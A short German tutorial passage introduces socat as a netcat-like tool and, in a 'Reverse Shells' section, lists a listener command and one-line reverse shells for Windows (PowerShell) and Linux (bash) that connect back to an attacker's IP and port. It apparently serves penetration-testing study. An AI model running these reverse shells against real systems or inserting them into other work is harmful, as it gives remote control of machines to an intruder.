Socat ähnelt netcat in mancher Hinsicht, unterscheidet sich aber in vielen anderen Punkten grundlegend. Am einfachsten kann man sich socat als eine Verbindung zwischen zwei Punkten vorstellen. Alles, was socat tut, ist, eine Verbindung zwischen zwei Punkten herzustellen - ähnlich wie die Portalgun!


### Reverse Shells

Da die Syntax für Netcat durch Verfeinerungen immer Komplexer werden kann hier erstmal die Basic Syntax

```
socat TCP-L <PORT>
```

Diese Shell verbindet wie oben gesagt zwei Punkte direkt miteinander. Allerdings ist das Resultat etwas instabil und vergleichbar mit `nc -lvnp <Port>`

Unter Windows würden wir diesen Befehl verwenden, um eine Rückverbindung herzustellen:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

Die Option „pipes“ wird verwendet, um Powershell (oder cmd.exe) zu zwingen, die Standardein- und -ausgabe im Unix-Stil zu verwenden 
Dies ist der entsprechende Befehl für ein Linux-Ziel:

```
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC: „bash -li“
```